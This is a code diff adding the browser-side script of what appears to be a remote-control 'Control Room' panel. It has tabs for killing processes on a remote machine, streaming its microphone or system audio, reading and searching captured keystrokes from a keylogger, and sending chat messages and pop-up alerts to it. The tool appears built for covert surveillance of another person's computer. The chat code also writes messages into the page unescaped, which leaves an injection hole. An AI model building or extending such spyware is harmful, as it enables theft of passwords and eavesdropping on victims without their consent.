+function sortProcs(key) { if(procSortKey===key) procSortAsc=!procSortAsc; else { procSortKey=key; procSortAsc=false; } renderProcesses(); }
+function killProcess(pid,name) { if(confirm('Kill '+name+' ('+pid+')?')) socket.emit('process_kill',{pid}); }
+socket.on('process_kill_status', d => { if(d.success) refreshProcesses(); else alert(d.error); });
+
+// ============================================================
+//  AUDIO TAB
+// ============================================================
+let audioCtx=null, audioGain=null, isAudioPlaying=false, audioSource='mic';
+const audioCanvas=document.getElementById('audioVisualizer');
+const audioCtx2d=audioCanvas.getContext('2d');
+let analyser=null;
+
+function startAudio(src) {
+    audioSource=src;
+    document.getElementById('micBtn').classList.toggle('active',src==='mic');
+    document.getElementById('sysBtn').classList.toggle('active',src==='system');
+    if(isAudioPlaying) { socket.emit('audio_stop'); setTimeout(()=>socket.emit('audio_start',{source:src}),300); }
+}
+function toggleAudio() {
+    const btn=document.getElementById('audioPlayBtn');
+    if(!isAudioPlaying) {
+        audioCtx=new (window.AudioContext||window.webkitAudioContext)({sampleRate:16000});
+        audioGain=audioCtx.createGain(); audioGain.gain.value=0.8; audioGain.connect(audioCtx.destination);
+        analyser=audioCtx.createAnalyser(); analyser.fftSize=256;
+        audioGain.connect(analyser); drawAudioVis();
+        socket.emit('audio_start',{source:audioSource});
+        isAudioPlaying=true; btn.textContent='⏹'; btn.classList.add('recording');
+    } else {
+        socket.emit('audio_stop'); isAudioPlaying=false;
+        btn.textContent='▶'; btn.classList.remove('recording');
+        if(audioCtx) audioCtx.close();
+    }
+}
+socket.on('audio_chunk', d => {
+    if(!audioCtx||!isAudioPlaying) return;
+    const raw=atob(d.data), arr=new Int16Array(raw.length/2);
+    for(let i=0;i<arr.length;i++) arr[i]=raw.charCodeAt(i*2)|(raw.charCodeAt(i*2+1)<<8);
+    const floats=new Float32Array(arr.length);
+    for(let i=0;i<arr.length;i++) floats[i]=arr[i]/32768;
+    const buf=audioCtx.createBuffer(1,floats.length,16000);
+    buf.getChannelData(0).set(floats);
+    const src=audioCtx.createBufferSource(); src.buffer=buf;
+    src.connect(audioGain); src.start();
+});
+socket.on('audio_error', d => alert('Audio error: '+d.error));
+function setVolume(v) { if(audioGain) audioGain.gain.value=v/100; }
+function drawAudioVis() {
+    if(!isAudioPlaying) return;
+    requestAnimationFrame(drawAudioVis);
+    const w=audioCanvas.width=audioCanvas.clientWidth, h=audioCanvas.height=audioCanvas.clientHeight;
+    audioCtx2d.fillStyle='rgba(10,10,15,0.3)'; audioCtx2d.fillRect(0,0,w,h);
+    if(!analyser) return;
+    const data=new Uint8Array(analyser.frequencyBinCount); analyser.getByteFrequencyData(data);
+    const barW=w/data.length*2;
+    for(let i=0;i<data.length;i++) {
+        const v=data[i]/255, barH=v*h;
+        const hue=120+i*2;
+        audioCtx2d.fillStyle=`hsla(${hue},80%,55%,0.8)`;
+        audioCtx2d.fillRect(i*barW,h-barH,barW-1,barH);
+    }
+}
+
+// ============================================================
+//  KEYLOGGER TAB
+// ============================================================
+function fetchKeylog() {
+    const s=document.getElementById('keylogSearch').value;
+    socket.emit('keylog_fetch',{search:s});
+}
+socket.on('keylog_data', d => {
+    document.getElementById('keylogCount').textContent=d.total+' keys';
+    const el=document.getElementById('keylogOutput');
+    el.innerHTML=d.entries.map(e=>{
+        const special=['space','enter','backspace','tab','shift','ctrl','alt','caps_lock','escape'].includes(e.key);
+        return `<span class="key-badge${special?' special':''}" title="${e.time}">${e.key==='space'?'␣':e.key}</span>`;
+    }).join('');
+    el.scrollTop=el.scrollHeight;
+});
+function clearKeylog() { if(confirm('Clear all keystrokes?')) socket.emit('keylog_clear'); }
+socket.on('keylog_cleared', ()=>{ document.getElementById('keylogOutput').innerHTML=''; document.getElementById('keylogCount').textContent='0 keys'; });
+document.getElementById('keylogSearch').addEventListener('input', fetchKeylog);
+
+// ============================================================
+//  CHAT TAB
+// ============================================================
+function sendChat() {
+    const input=document.getElementById('chatInput'); if(!input.value.trim()) return;
+    socket.emit('chat_send',{message:input.value}); input.value='';
+}
+socket.on('chat_received', d => {
+    const el=document.getElementById('chatMessages');
+    el.innerHTML+=`<div class="chat-bubble sent"><div>${d.message}</div><div class="chat-time">${d.time}</div></div>`;
+    el.scrollTop=el.scrollHeight;
+});
+socket.on('chat_data', d => {
+    const el=document.getElementById('chatMessages');
+    el.innerHTML=d.messages.map(m=>`<div class="chat-bubble sent"><div>${m.message}</div><div class="chat-time">${m.time}</div></div>`).join('');
+    el.scrollTop=el.scrollHeight;
+});
+function sendAlert() {
+    const t=document.getElementById('alertTitle').value, m=document.getElementById('alertMsg').value, i=document.getElementById('alertIcon').value;
+    if(!m) return; socket.emit('alert_send',{title:t,message:m,icon:i});
+    document.getElementById('alertMsg').value='';
+}
+socket.on('alert_sent', () => {});
+
+// Auto-start terminal on first visit
+socket.on('connect', () => console.log('🔥 Connected to Control Room'));
+</script>
+</body>
+</html>
